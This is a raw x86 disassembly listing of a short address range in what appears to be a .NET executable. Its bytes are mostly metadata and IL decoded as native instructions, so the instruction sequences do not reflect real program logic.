  4026ab:	add    al,0x2
  4026ad:	jnp    0x4026b8
  4026af:	add    BYTE PTR [eax],al
  4026b1:	add    al,0x6f
  4026b3:	add    al,BYTE PTR [eax]
  4026b5:	add    BYTE PTR [esi],al
  4026b7:	sub    dl,BYTE PTR [ebx]
  4026b9:	xor    BYTE PTR [ebx],al
  4026bb:	add    BYTE PTR ds:0x2000000,dl
  4026c1:	add    BYTE PTR [eax],al
  4026c3:	adc    DWORD PTR [edx],eax
  4026c5:	jnp    0x4026cd
  4026c7:	add    BYTE PTR [eax],al
  4026c9:	add    al,0x2
  4026cb:	sub    BYTE PTR [eax+eax*1],cl
  4026ce:	add    BYTE PTR [esi],al
  4026d0:	add    ebp,DWORD PTR [edi+0x3]
  4026d3:	add    BYTE PTR [eax],al
  4026d5:	push   es
  4026d6:	or     al,BYTE PTR [esi]
  4026d8:	sub    cl,BYTE PTR [edx+0x2]
  4026db:	jnp    0x4026e8
  4026dd:	add    BYTE PTR [eax],al
  4026df:	add    al,0x16
  4026e1:	lea    eax,[ecx]
  4026e3:	add    BYTE PTR [eax],al
  4026e5:	add    DWORD PTR [edi+0x47],ebp
  4026e8:	add    BYTE PTR [eax],al
  4026ea:	or     ch,BYTE PTR [edx]
  4026ec:	adc    esi,DWORD PTR [eax]
  4026ee:	add    eax,0x1e00
  4026f3:	add    BYTE PTR [ecx],cl
  4026f5:	add    BYTE PTR [eax],al
  4026f7:	adc    DWORD PTR [edx],eax
  4026f9:	jnp    0x402707
  4026fb:	add    BYTE PTR [eax],al
  4026fd:	add    al,0x3
  4026ff:	sbb    BYTE PTR [ebp+0x1000001],cl
  402705:	or     al,BYTE PTR [esi]
  402707:	push   ss
  402708:	add    al,0xa2
  40270a:	push   es
  40270b:	pop    ss
  40270c:	add    eax,0x486f06a2
  402711:	add    BYTE PTR [eax],al
  402713:	or     ah,BYTE PTR [esi]
  402715:	sub    al,BYTE PTR [eax]
  402717:	add    BYTE PTR [ebx],dl
  402719:	xor    BYTE PTR ds:0x1a00,al
  40271f:	add    BYTE PTR [ecx],cl
  402721:	add    BYTE PTR [eax],al
  402723:	adc    DWORD PTR [edx],eax
  402725:	jnp    0x402734
  402727:	add    BYTE PTR [eax],al
  402729:	add    al,0x3
  40272b:	pop    ss
  40272c:	lea    eax,[ecx]
  40272e:	add    BYTE PTR [eax],al
  402730:	add    DWORD PTR [edx],ecx
  402732:	push   es
  402733:	push   ss
  402734:	add    al,0xa2
  402736:	push   es
  402737:	outs   dx,DWORD PTR ds:[esi]
  402738:	dec    eax
  402739:	add    BYTE PTR [eax],al
  40273b:	or     ah,BYTE PTR [esi]
  40273d:	sub    al,BYTE PTR [esi+0x2]
  402740:	sub    BYTE PTR [eax+eax*1],cl
  402743:	add    BYTE PTR [esi],al
  402745:	outs   dx,DWORD PTR ds:[esi]
  402746:	dec    ecx
  402747:	add    BYTE PTR [eax],al
  402749:	or     ch,BYTE PTR [eax]
  40274b:	dec    edx
  40274c:	add    BYTE PTR [eax],al
  40274e:	or     ch,BYTE PTR [edx]
  402750:	into   
  402751:	add    ch,BYTE PTR [eax]
  402753:	pop    ss
  402754:	add    BYTE PTR [eax],al
  402756:	or     al,BYTE PTR [edx]
  402758:	add    al,0x7d
  40275a:	sldt   WORD PTR [eax]
  40275d:	add    al,0x2
  40275f:	add    eax,0x107d
  402764:	add    al,0x2
  402766:	add    edi,DWORD PTR [ebp+0xe]
  402769:	add    BYTE PTR [eax],al
  40276b:	add    al,0x2
  40276d:	add    bh,BYTE PTR [ebx+0x10]
  402770:	add    BYTE PTR [eax],al
  402772:	add    al,0x2
  402774:	jnp    0x402785
  402776:	add    BYTE PTR [eax],al
  402778:	add    al,0x6f
  40277a:	dec    ebx
  40277b:	add    BYTE PTR [eax],al
  40277d:	or     bh,BYTE PTR [ebp+0x11]
  402780:	add    BYTE PTR [eax],al
  402782:	add    al,0x2a
  402784:	push   ds
  402785:	add    bh,BYTE PTR [ebx+0xf]
  402788:	add    BYTE PTR [eax],al
  40278a:	add    al,0x2a
  40278c:	mov    dl,0x2
  40278e:	jnp    0x4027a1
  402790:	add    BYTE PTR [eax],al
  402792:	add    al,0x14
  402794:	sub    BYTE PTR [eax+eax*1+0x0],cl
  402798:	or     ch,BYTE PTR ds:0x22a1402
  40279e:	jnp    0x4027ae
  4027a0:	add    BYTE PTR [eax],al
  4027a2:	add    al,0x2
  4027a4:	jnp    0x4027b7
  4027a6:	add    BYTE PTR [eax],al
  4027a8:	add    al,0x6f
  4027aa:	dec    ebp
  4027ab:	add    BYTE PTR [eax],al
  4027ad:	or     ch,BYTE PTR [edi+0x2b]
  4027b0:	add    BYTE PTR [eax],al
  4027b2:	or     ch,BYTE PTR [edi+0x2]
  4027b5:	add    BYTE PTR [eax],al
  4027b7:	push   es
  4027b8:	sub    ch,BYTE PTR [esi]
  4027ba:	jb     0x4027b5
  4027bc:	add    BYTE PTR [eax],al
  4027be:	jo     0x402833
  4027c0:	dec    esi
  4027c1:	add    BYTE PTR [eax],al
  4027c3:	or     bh,BYTE PTR [edx+0xa]
  4027c6:	push   ss
  4027c7:	sub    cl,BYTE PTR [edx]
  4027c9:	push   ss
  4027ca:	sub    bh,BYTE PTR [edx+0x2]
  4027cd:	jnp    0x4027e0
  4027cf:	add    BYTE PTR [eax],al
  4027d1:	add    al,0x6f
  4027d3:	dec    edi
  4027d4:	add    BYTE PTR [eax],al
  4027d6:	or     ch,BYTE PTR [edi+ecx*1]
  4027d9:	add    bh,BYTE PTR [ebx+0x11]
  4027dc:	add    BYTE PTR [eax],al
  4027de:	add    al,0x6f
  4027e0:	push   eax
  4027e1:	add    BYTE PTR [eax],al
  4027e3:	or     dl,BYTE PTR [esi]
  4027e5:	inc    BYTE PTR [ecx]
  4027e7:	sub    dl,BYTE PTR [esi]
  4027e9:	sub    dl,dl
  4027eb:	add    bh,BYTE PTR [ebx+0x11]
  4027ee:	add    BYTE PTR [eax],al
  4027f0:	add    al,0x14
  4027f2:	sub    BYTE PTR [eax+eax*1+0x0],cl
  4027f6:	or     ch,BYTE PTR [ebx+ebx*1]
  4027f9:	add    bh,BYTE PTR [ebx+0x11]
  4027fc:	add    BYTE PTR [eax],al
  4027fe:	add    al,0x6f
  402800:	dec    edi
  402801:	add    BYTE PTR [eax],al
  402803:	or     ch,BYTE PTR [esi+ecx*1]
  402806:	add    bh,BYTE PTR [ebx+0x11]
  402809:	add    BYTE PTR [eax],al
  40280b:	add    al,0x3
  40280d:	adc    al,0x6f
  40280f:	push   ecx
  402810:	add    BYTE PTR [eax],al
  402812:	or     ch,BYTE PTR [edx]
  402814:	jb     0x402825
  402816:	add    DWORD PTR [eax],eax
  402818:	jo     0x40288d
  40281a:	push   edx
  40281b:	add    BYTE PTR [eax],al
  40281d:	or     bh,BYTE PTR [edx+0x0]
  402820:	adc    esi,DWORD PTR [eax]
  402822:	add    al,0x0
  402824:	pop    edx
  402825:	add    BYTE PTR [eax],al
  402827:	add    BYTE PTR [edx],cl
  402829:	add    BYTE PTR [eax],al
  40282b:	adc    DWORD PTR [edx],eax
  40282d:	jnp    0x402840
  40282f:	add    BYTE PTR [eax],al
  402831:	add    al,0x14
  402833:	sub    BYTE PTR [eax+eax*1+0x0],cl
  402837:	or     ch,BYTE PTR [ecx+eax*2]
  40283a:	add    bh,BYTE PTR [ebx+0x11]
  40283d:	add    BYTE PTR [eax],al
  40283f:	add    al,0x6f
  402841:	push   eax
  402842:	add    BYTE PTR [eax],al
  402844:	or     ch,BYTE PTR [esp+esi*1]
  402847:	add    bh,BYTE PTR [ebx+0x11]
  40284a:	add    BYTE PTR [eax],al
  40284c:	add    al,0x6f
  40284e:	dec    ebp
  40284f:	add    BYTE PTR [eax],al
  402851:	or     cl,BYTE PTR [edx]
  402853:	push   es
  402854:	outs   dx,DWORD PTR ds:[esi]
  402855:	push   ebx
  402856:	add    BYTE PTR [eax],al
  402858:	or     ch,BYTE PTR [ecx+edx*1]
  40285b:	push   es
  40285c:	add    al,0x6f
  40285e:	push   esp
  40285f:	add    BYTE PTR [eax],al
  402861:	or     cl,BYTE PTR [ebx]
  402863:	push   es
  402864:	pop    es
  402865:	sub    BYTE PTR [ebp+0x0],dl
  402868:	add    BYTE PTR [edx],cl
  40286a:	adc    BYTE PTR [edx],al
  40286c:	add    bh,BYTE PTR [ebx+0x11]
  40286f:	add    BYTE PTR [eax],al
  402871:	add    al,0x3
  402873:	add    al,0x14
  402875:	outs   dx,DWORD PTR ds:[esi]
  402876:	push   esi
  402877:	add    BYTE PTR [eax],al
  402879:	or     ch,BYTE PTR [edx]
  40287b:	jb     0x40289e
  40287d:	add    DWORD PTR [eax],eax
  40287f:	jo     0x4028f4
  402881:	push   edx
  402882:	add    BYTE PTR [eax],al
  402884:	or     bh,BYTE PTR [edx+0x1e]
  402887:	jae    0x4028c8
  402889:	add    BYTE PTR [eax],al
  40288b:	push   es
  40288c:	sub    al,BYTE PTR es:[eax]
  40288f:	add    BYTE PTR [ebx],dl
  402891:	xor    BYTE PTR [edx],al
  402893:	add    BYTE PTR [esi+0xb000000],dl
  402899:	add    BYTE PTR [eax],al
  40289b:	adc    DWORD PTR [esi],edx
  40289d:	or     dh,BYTE PTR [edx+0x33]
  4028a0:	add    DWORD PTR [eax],eax
  4028a2:	jo     0x4028cc
  4028a4:	pop    eax
  4028a5:	add    BYTE PTR [eax],al
  4028a7:	or     dl,BYTE PTR [edx]
  4028a9:	add    BYTE PTR [eax],ch
  4028ab:	pop    ecx
  4028ac:	add    BYTE PTR [eax],al
  4028ae:	or     ch,BYTE PTR [ecx+esi*1]
  4028b1:	rol    BYTE PTR [esi+0x0],1
  4028b4:	add    BYTE PTR [ecx],al
  4028b6:	sub    BYTE PTR [edx],dh
  4028b8:	add    BYTE PTR [eax],al
  4028ba:	or     al,BYTE PTR [esi]
  4028bc:	mov    WORD PTR [ebp+0x0],es
  4028bf:	add    BYTE PTR [ecx],al
  4028c1:	sub    BYTE PTR [edx+0x0],bl
  4028c4:	add    BYTE PTR [edx],cl
  4028c6:	sub    al,0x1a
  4028c8:	rol    BYTE PTR [esi+0x0],1
  4028cb:	add    BYTE PTR [ecx],al
  4028cd:	sub    BYTE PTR [edx],dh
  4028cf:	add    BYTE PTR [eax],al
  4028d1:	or     al,BYTE PTR [esi]
  4028d3:	sub    BYTE PTR [ebx+0x0],bl
  4028d6:	add    BYTE PTR [edx],cl
  4028d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028d9:	inc    esi
  4028da:	add    BYTE PTR [eax],al
  4028dc:	add    DWORD PTR [eax],ebp
  4028de:	pop    esp
  4028df:	add    BYTE PTR [eax],al
  4028e1:	or     dh,BYTE PTR [edx+0x69]
  4028e4:	add    DWORD PTR [eax],eax
  4028e6:	jo     0x402910
  4028e8:	pop    eax
  4028e9:	add    BYTE PTR [eax],al
  4028eb:	or     cl,BYTE PTR [ebx]
  4028ed:	pop    es
  4028ee:	sub    BYTE PTR [ecx],bl
  4028f0:	add    BYTE PTR [eax],al
  4028f2:	or     ch,BYTE PTR ds:0x212071a
  4028f8:	sub    BYTE PTR [ecx+0x0],bl
  4028fb:	add    BYTE PTR [edx],cl
  4028fd:	sub    al,0x10
  4028ff:	or     BYTE PTR [esi],dl
  402901:	xor    DWORD PTR [eax+ecx*1],ecx
  402904:	and    al,ch
  402906:	add    eax,DWORD PTR [eax]
  402908:	add    BYTE PTR [edx+0x28],bl
  40290b:	pop    ebp
  40290c:	add    BYTE PTR [eax],al
  40290e:	or     bh,BYTE PTR [esi+0x12]
  402911:	add    BYTE PTR [eax],al
  402913:	add    al,0x2d
  402915:	adc    DWORD PTR [esi+edi*8],edx
  402918:	push   es
  402919:	cmp    DWORD PTR [eax],eax
  40291b:	add    BYTE PTR [esi],al
  40291d:	jae    0x40297d
  40291f:	add    BYTE PTR [eax],al
  402921:	or     al,BYTE PTR [eax+0x4000012]
  402927:	jle    0x40293b
  402929:	add    BYTE PTR [eax],al
  40292b:	add    al,0x28
  40292d:	pop    edi
  40292e:	add    BYTE PTR [eax],al
  402930:	or     ch,BYTE PTR [edx]
  402932:	push   ds
  402933:	add    ch,BYTE PTR [eax]
  402935:	pop    ss
  402936:	add    BYTE PTR [eax],al
  402938:	or     ch,BYTE PTR [edx]
  40293a:	add    BYTE PTR [eax],al
  40293c:	adc    esi,DWORD PTR [eax]
  40293e:	add    al,BYTE PTR [eax]
  402940:	mov    al,BYTE PTR [eax]
  402942:	add    BYTE PTR [eax],al
  402944:	or     al,0x0
  402946:	add    BYTE PTR [ecx],dl
  402948:	jae    0x4029aa
  40294a:	add    BYTE PTR [eax],al
  40294c:	or     al,BYTE PTR [eax+0x4000014]
  402952:	rol    BYTE PTR [edi],1
  402954:	add    BYTE PTR [eax],al
  402956:	add    ch,BYTE PTR [eax]
  402958:	xor    al,BYTE PTR [eax]
  40295a:	add    BYTE PTR [edx],cl
  40295c:	outs   dx,DWORD PTR ds:[esi]
  40295d:	popa   
  40295e:	add    BYTE PTR [eax],al
  402960:	or     ch,BYTE PTR [edi+0x62]
  402963:	add    BYTE PTR [eax],al
  402965:	or     ch,BYTE PTR [edi+0x63]
  402968:	add    BYTE PTR [eax],al
  40296a:	or     dh,BYTE PTR [ebx+0x64]
  40296d:	add    BYTE PTR [eax],al
  40296f:	or     ch,BYTE PTR [eax]
  402971:	add    BYTE PTR gs:[eax],al
  402974:	or     ch,BYTE PTR [edi+0x66]
  402977:	add    BYTE PTR [eax],al
  402979:	or     cl,BYTE PTR [ebx]
  40297b:	push   ss
  40297c:	or     al,0x2b
  40297e:	dec    esp
  40297f:	pop    es
  402980:	or     BYTE PTR [edx+0x167e0a],bl
  402986:	add    BYTE PTR [esi+eax*1],al
  402989:	outs   dx,DWORD PTR ds:[esi]
  40298a:	add    BYTE PTR [bx+si],al
  40298d:	or     ch,BYTE PTR [edi+0x68]
  402990:	add    BYTE PTR [eax],al
  402992:	or     ch,BYTE PTR [edi+0x69]
  402995:	add    BYTE PTR [eax],al
  402997:	or     ch,BYTE PTR ds:0x157e2d
  40299d:	add    BYTE PTR [esi+eax*1],al
  4029a0:	outs   dx,DWORD PTR ds:[esi]
  4029a1:	push   0x0
  4029a3:	add    BYTE PTR [edx],cl
  4029a5:	outs   dx,DWORD PTR ds:[esi]
  4029a6:	imul   eax,DWORD PTR [eax],0x0
  4029a9:	or     ch,BYTE PTR [edi+0x69]
  4029ac:	add    BYTE PTR [eax],al
  4029ae:	or     ch,BYTE PTR [esi+edx*1]
  4029b1:	jle    0x4029c7
  4029b3:	add    BYTE PTR [eax],al
  4029b5:	add    al,0x6
  4029b7:	outs   dx,DWORD PTR ds:[esi]
  4029b8:	add    BYTE PTR [bx+si],al
  4029bb:	or     ch,BYTE PTR [eax]
  4029bd:	ins    BYTE PTR es:[edi],dx
  4029be:	add    BYTE PTR [eax],al
  4029c0:	or     ch,BYTE PTR [edi+0x6d]
  4029c3:	add    BYTE PTR [eax],al
  4029c5:	or     ah,BYTE PTR [esi]
  4029c7:	or     BYTE PTR [edi],dl
  4029c9:	pop    eax
  4029ca:	or     al,0x8
  4029cc:	pop    es
  4029cd:	mov    gs,WORD PTR [ecx+0x32]
  4029d0:	scas   al,BYTE PTR es:[edi]
  4029d1:	sub    al,BYTE PTR [eax]
  4029d3:	add    BYTE PTR [ebx],al
  4029d5:	xor    BYTE PTR [eax+eax*1],al
  4029d8:	inc    edi
  4029d9:	add    BYTE PTR [eax],al
  4029db:	add    BYTE PTR [eax],al
  4029dd:	add    BYTE PTR [eax],al
  4029df:	add    BYTE PTR [esi+0x14],bh
  4029e2:	add    BYTE PTR [eax],al
  4029e4:	add    al,0x2d
  4029e6:	push   es
  4029e7:	add    ch,BYTE PTR [eax]
  4029e9:	cmp    al,BYTE PTR [eax]
  4029eb:	add    BYTE PTR [esi],al
  4029ed:	add    bh,BYTE PTR [ebx+0x13]
  4029f0:	add    BYTE PTR [eax],al
  4029f2:	add    al,0x2d
  4029f4:	adc    BYTE PTR [edx],al
  4029f6:	jle    0x402a0c
  4029f8:	add    BYTE PTR [eax],al
  4029fa:	add    al,0x73
  4029fc:	add    DWORD PTR [eax],eax
  4029fe:	add    BYTE PTR [esi],al
  402a00:	jge    0x402a15
  402a02:	add    BYTE PTR [eax],al
  402a04:	add    al,0x3
  402a06:	jb     0x40299b
  402a08:	add    DWORD PTR [eax],eax
  402a0a:	jo     0x402a23
  402a0c:	sub    BYTE PTR [eax+eax*1],ah
  402a0f:	add    BYTE PTR [edx],cl
  402a11:	sub    BYTE PTR [esi+0x0],ch
  402a14:	add    BYTE PTR [edx],cl
  402a16:	sub    eax,0x22a1402
  402a1b:	jnp    0x402a30
  402a1d:	add    BYTE PTR [eax],al
  402a1f:	add    al,0x3
  402a21:	outs   dx,DWORD PTR ds:[esi]
  402a22:	add    al,BYTE PTR [eax]
  402a24:	add    BYTE PTR [esi],al
  402a26:	sub    bl,BYTE PTR [esi]
  402a28:	push   ss
  402a29:	lea    ecx,[edi]
  402a2b:	add    BYTE PTR [eax],al
  402a2d:	add    DWORD PTR [edx],ebp
  402a2f:	add    BYTE PTR [ebx],bl
  402a31:	xor    BYTE PTR [eax+eax*1],al
  402a34:	aas    
  402a35:	add    BYTE PTR [eax],al
  402a37:	add    BYTE PTR ds:0x73110000,cl
  402a3d:	outs   dx,DWORD PTR ds:[esi]
  402a3e:	add    BYTE PTR [eax],al
  402a40:	or     cl,BYTE PTR [edx]
  402a42:	push   es
  402a43:	sbb    DWORD PTR [ebp+0x1000027],ecx
  402a49:	or     eax,DWORD PTR [edi]
  402a4b:	push   ss
  402a4c:	jb     0x402a25
  402a4e:	add    DWORD PTR [eax],eax
  402a50:	jo     0x4029f4
  402a52:	pop    es
  402a53:	pop    ss
  402a54:	jb     0x402a4f
  402a56:	add    DWORD PTR [eax],eax
  402a58:	jo     0x4029fc
  402a5a:	pop    es
  402a5b:	sbb    BYTE PTR [edx-0x3],dh
  402a5e:	add    DWORD PTR [eax],eax
  402a60:	jo     0x402a04
  402a62:	pop    es
  402a63:	outs   dx,DWORD PTR ds:[esi]
  402a64:	jo     0x402a66
  402a66:	add    BYTE PTR [edx],cl
  402a68:	fimul  WORD PTR [edx]
  402a6a:	push   es
  402a6b:	sub    al,0x6
  402a6d:	push   es
  402a6e:	outs   dx,DWORD PTR ds:[esi]
  402a6f:	sub    al,BYTE PTR [eax]
  402a71:	add    BYTE PTR [edx],cl
  402a73:	fcom   QWORD PTR [esi]
  402a75:	sub    BYTE PTR [ecx+0x0],dh
  402a78:	add    BYTE PTR [edx],cl
  402a7a:	sub    al,BYTE PTR [eax]
  402a7c:	add    DWORD PTR [eax],edx
  402a7e:	add    BYTE PTR [eax],al
  402a80:	add    al,BYTE PTR [eax]
  402a82:	push   es
  402a83:	add    BYTE PTR [eax],ch
  402a85:	add    BYTE PTR cs:[edx],cl
  402a88:	add    BYTE PTR [eax],al
  402a8a:	add    BYTE PTR [eax],al
  402a8c:	adc    esi,DWORD PTR [eax]
  402a8e:	add    al,BYTE PTR [eax]
  402a90:	xor    eax,DWORD PTR [eax]
  402a92:	add    BYTE PTR [eax],al
  402a94:	push   cs
  402a95:	add    BYTE PTR [eax],al
  402a97:	adc    DWORD PTR [ebx],eax
  402a99:	outs   dx,DWORD PTR ds:[esi]
  402a9a:	jb     0x402a9c
  402a9c:	add    BYTE PTR [edx],cl
  402a9e:	sub    al,0x1
  402aa0:	sub    bh,BYTE PTR [esi+0x17]
  402aa3:	add    BYTE PTR [eax],al
  402aa5:	add    al,0x2d
  402aa7:	adc    DWORD PTR [esi+edi*8],edx
  402aaa:	push   es
  402aab:	inc    eax
  402aac:	add    BYTE PTR [eax],al
  402aae:	push   es
  402aaf:	jae    0x402b24
  402ab1:	add    BYTE PTR [eax],al
  402ab3:	or     al,BYTE PTR [eax+0x4000017]
  402ab9:	jle    0x402ad2
  402abb:	add    BYTE PTR [eax],al
  402abd:	add    al,0x73
  402abf:	je     0x402ac1
  402ac1:	add    BYTE PTR [edx],cl
  402ac3:	or     al,BYTE PTR [esi]
  402ac5:	outs   dx,DWORD PTR ds:[esi]
  402ac6:	jne    0x402ac8
  402ac8:	add    BYTE PTR [edx],cl
  402aca:	sub    dh,BYTE PTR [esi]
  402acc:	add    al,BYTE PTR [ebx]
  402ace:	outs   dx,DWORD PTR ds:[esi]
  402acf:	sub    eax,DWORD PTR [eax]
  402ad1:	add    BYTE PTR [edx],cl
  402ad3:	sub    BYTE PTR [ebx],bh
  402ad5:	add    BYTE PTR [eax],al
  402ad7:	push   es
  402ad8:	sub    al,BYTE PTR [eax]
  402ada:	add    BYTE PTR [eax],al
  402adc:	adc    esi,DWORD PTR [eax]
  402ade:	add    eax,DWORD PTR [eax]
  402ae0:	add    DWORD PTR [eax],0x0
  402ae3:	add    BYTE PTR [edi],cl
  402ae5:	add    BYTE PTR [eax],al
  402ae7:	adc    DWORD PTR [eax+eax*4],edx
  402aea:	adc    al,0x0
  402aec:	add    BYTE PTR [ecx+ebx*1],al
  402aef:	lea    esp,[edi]
  402af1:	add    BYTE PTR [eax],al
  402af3:	add    DWORD PTR [edx],ecx
  402af5:	push   es
  402af6:	push   ss
  402af7:	jb     0x402b12
  402af9:	add    al,BYTE PTR [eax]
  402afb:	jo     0x402a9f
  402afd:	push   es
  402afe:	pop    ss
  402aff:	jb     0x402b24
  402b01:	add    al,BYTE PTR [eax]
  402b03:	jo     0x402aa7
  402b05:	push   es
  402b06:	sbb    BYTE PTR [edx+0x2d],dh
  402b09:	add    al,BYTE PTR [eax]
  402b0b:	jo     0x402aaf
  402b0d:	push   es
  402b0e:	jae    0x402b86
  402b10:	add    BYTE PTR [eax],al
  402b12:	or     al,BYTE PTR [eax+0x4000015]
  402b18:	push   ds
  402b19:	lea    esp,[edi]
  402b1b:	add    BYTE PTR [eax],al
  402b1d:	add    DWORD PTR [ebx],ecx
  402b1f:	pop    es
  402b20:	push   ss
  402b21:	jb     0x402b5e
  402b23:	add    al,BYTE PTR [eax]
  402b25:	jo     0x402ac9
  402b27:	pop    es
  402b28:	pop    ss
  402b29:	jb     0x402ada
  402b2b:	add    al,BYTE PTR [eax]
  402b2d:	jo     0x402ad1
  402b2f:	pop    es
  402b30:	sbb    BYTE PTR [edx+0x9],dh
  402b33:	add    eax,DWORD PTR [eax]
  402b35:	jo     0x402ad9
  402b37:	pop    es
  402b38:	sbb    DWORD PTR [edx+0x7d],esi
  402b3b:	add    eax,DWORD PTR [eax]
  402b3d:	jo     0x402ae1
  402b3f:	pop    es
  402b40:	sbb    dh,BYTE PTR [edx+0x8]
  402b43:	add    al,0x0
  402b45:	jo     0x402ae9
  402b47:	pop    es
  402b48:	sbb    esi,DWORD PTR [edx+0x70]
  402b4b:	add    al,0x0
  402b4d:	jo     0x402af1
  402b4f:	pop    es
  402b50:	sbb    al,0x72
  402b52:	aam    0x4
  402b54:	add    BYTE PTR [eax-0x5e],dh
  402b57:	pop    es
  402b58:	sbb    eax,0x52472
  402b5d:	jo     0x402b01
  402b5f:	pop    es
  402b60:	jae    0x402bd8
  402b62:	add    BYTE PTR [eax],al
  402b64:	or     al,BYTE PTR [eax+0x4000016]
  402b6a:	sub    bl,BYTE PTR [esi]
  402b6c:	add    ch,BYTE PTR [eax]
  402b6e:	ja     0x402b70
  402b70:	add    BYTE PTR [edx],cl
  402b72:	sub    al,BYTE PTR [eax]
  402b74:	inc    edx
  402b75:	push   ebx
  402b76:	dec    edx
  402b77:	inc    edx
  402b78:	add    DWORD PTR [eax],eax
  402b7a:	add    DWORD PTR [eax],eax
  402b7c:	add    BYTE PTR [eax],al
  402b7e:	add    BYTE PTR [eax],al
  402b80:	or     al,0x0
  402b82:	add    BYTE PTR [eax],al
  402b84:	jbe    0x402bba
  402b86:	xor    BYTE PTR cs:[esi],ch
  402b89:	xor    esi,DWORD PTR [eax]
  402b8b:	xor    esi,DWORD PTR [ecx]
  402b8d:	cmp    DWORD PTR [eax],eax
  402b8f:	add    BYTE PTR [eax],al
  402b91:	add    BYTE PTR ds:0x6c00,al
  402b97:	add    BYTE PTR [ebp+ecx*1+0x7e230000],bl
  402b9e:	add    BYTE PTR [eax],al
  402ba0:	or     BYTE PTR [esi],cl
  402ba2:	add    BYTE PTR [eax],al
  402ba4:	mov    WORD PTR [eax],ss
  402ba6:	add    BYTE PTR [eax],al
  402ba8:	and    edx,DWORD PTR [ebx+0x74]
  402bab:	jb     0x402c16
  402bad:	outs   dx,BYTE PTR ds:[esi]
  402bae:	addr16 jae 0x402bb1
  402bb1:	add    BYTE PTR [eax],al
  402bb3:	add    BYTE PTR [esi+ebx*1+0x57c0000],dl
  402bba:	add    BYTE PTR [eax],al
  402bbc:	and    edx,DWORD PTR [ebp+0x53]
  402bbf:	add    BYTE PTR [eax],dl
  402bc1:	and    al,0x0
  402bc3:	add    BYTE PTR [eax],dl
  402bc5:	add    BYTE PTR [eax],al
  402bc7:	add    BYTE PTR [ebx],ah
  402bc9:	inc    edi
  402bca:	push   ebp
  402bcb:	dec    ecx
  402bcc:	inc    esp
  402bcd:	add    BYTE PTR [eax],al
  402bcf:	add    BYTE PTR [eax],ah
  402bd1:	and    al,0x0
  402bd3:	add    BYTE PTR [eax],dl
  402bd5:	or     DWORD PTR [eax],eax
  402bd7:	add    BYTE PTR [ebx],ah
  402bd9:	inc    edx
  402bda:	ins    BYTE PTR es:[edi],dx
  402bdb:	outs   dx,DWORD PTR ds:[esi]
  402bdc:	bound  eax,QWORD PTR [eax]
  402bde:	add    BYTE PTR [eax],al
  402be0:	add    BYTE PTR [eax],al
  402be2:	add    BYTE PTR [eax],al
  402be4:	add    al,BYTE PTR [eax]
  402be6:	add    BYTE PTR [ecx],al
  402be8:	push   edi
  402be9:	pop    ss
  402bea:	mov    ds:0x1c0909,al
  402bef:	add    BYTE PTR [eax],al
  402bf1:	cli    
  402bf2:	and    eax,0x160033
  402bf7:	add    BYTE PTR [ecx],al
  402bf9:	add    BYTE PTR [eax],al
  402bfb:	add    BYTE PTR [ecx+0x0],dl
  402bfe:	add    BYTE PTR [eax],al
  402c00:	pop    es
  402c01:	add    BYTE PTR [eax],al
  402c03:	add    BYTE PTR [edi],dl
  402c05:	add    BYTE PTR [eax],al
  402c07:	add    BYTE PTR [ecx+0x0],al
  402c0a:	add    BYTE PTR [eax],al
  402c0c:	sub    eax,DWORD PTR [eax]
  402c0e:	add    BYTE PTR [eax],al
  402c10:	add    eax,DWORD PTR [eax]
  402c12:	add    BYTE PTR [eax],al
  402c14:	ja     0x402c16
  402c16:	add    BYTE PTR [eax],al
  402c18:	sbb    DWORD PTR [eax],eax
  402c1a:	add    BYTE PTR [eax],al
  402c1c:	sldt   WORD PTR [eax]
  402c1f:	add    BYTE PTR [ebx],al
  402c21:	add    BYTE PTR [eax],al
  402c23:	add    BYTE PTR [esi],bl
  402c25:	add    BYTE PTR [eax],al
  402c27:	add    BYTE PTR [esi],bl
  402c29:	add    BYTE PTR [eax],al
  402c2b:	add    BYTE PTR [eax+eax*1],cl
  402c2e:	add    BYTE PTR [eax],al
  402c30:	add    DWORD PTR [eax],eax
  402c32:	add    BYTE PTR [eax],al
  402c34:	pop    es
  402c35:	add    BYTE PTR [eax],al
  402c37:	add    BYTE PTR [ecx],al
  402c39:	add    BYTE PTR [eax],al
  402c3b:	add    BYTE PTR [ecx],al
  402c3d:	add    BYTE PTR [eax],al
  402c3f:	add    BYTE PTR [ecx],al
  402c41:	add    BYTE PTR [eax],al
  402c43:	add    BYTE PTR [eax],al
  402c45:	add    BYTE PTR [edx],cl
  402c47:	add    BYTE PTR [ecx],al
  402c49:	add    BYTE PTR [eax],al
  402c4b:	add    BYTE PTR [eax],al
  402c4d:	add    BYTE PTR [esi],al
  402c4f:	add    al,ch
  402c51:	add    cl,ah
  402c53:	add    BYTE PTR [edx],cl
  402c55:	add    BYTE PTR [esi],cl
  402c57:	add    edi,esi
  402c59:	add    BYTE PTR [edx],cl
  402c5b:	add    BYTE PTR [eax],bl
  402c5d:	add    edi,esi
  402c5f:	add    BYTE PTR [edx],cl
  402c61:	add    BYTE PTR [ecx+eax*1],dh
  402c64:	and    al,0x1
  402c66:	or     al,BYTE PTR [eax]
  402c68:	inc    eax
  402c69:	add    edi,esi
  402c6b:	add    BYTE PTR [esi],al
  402c6d:	add    BYTE PTR [ecx+0x1],dh
  402c70:	push   esi
  402c71:	add    DWORD PTR [esi],ecx
  402c73:	add    BYTE PTR [eax+0x6015601],ch
  402c79:	add    ch,bl
  402c7b:	add    ecx,esp
  402c7d:	add    BYTE PTR [esi],al
  402c7f:	add    BYTE PTR [ebx],dl
  402c81:	add    al,BYTE PTR [ecx]
  402c83:	add    al,BYTE PTR [esi]
  402c85:	add    BYTE PTR [edi+0x4],bl
  402c88:	add    DWORD PTR [edx],eax
  402c8a:	push   es
  402c8b:	add    BYTE PTR [ebx+0x4],bh
  402c8e:	add    DWORD PTR [edx],eax
  402c90:	push   es
  402c91:	add    BYTE PTR [esi+0x6020104],ch
  402c97:	add    al,dl
  402c99:	add    al,0xe1
  402c9b:	add    BYTE PTR [esi],al
  402c9d:	add    dh,ah
  402c9f:	add    al,0x1
  402ca1:	add    cl,BYTE PTR [edx]
  402ca3:	add    al,bh
  402ca5:	add    eax,0xa00f7
  402caa:	inc    eax
  402cab:	push   es
  402cac:	sbb    al,0x6
  402cae:	push   es
  402caf:	add    BYTE PTR [ebx],ah
  402cb1:	pop    es
  402cb2:	or     DWORD PTR [edi],eax
  402cb4:	push   es
  402cb5:	add    BYTE PTR [ebx+0x7],bl
  402cb8:	cmp    al,0x7
  402cba:	push   es
  402cbb:	add    BYTE PTR [edi+0x7],ch
  402cbe:	loope  0x402cc0
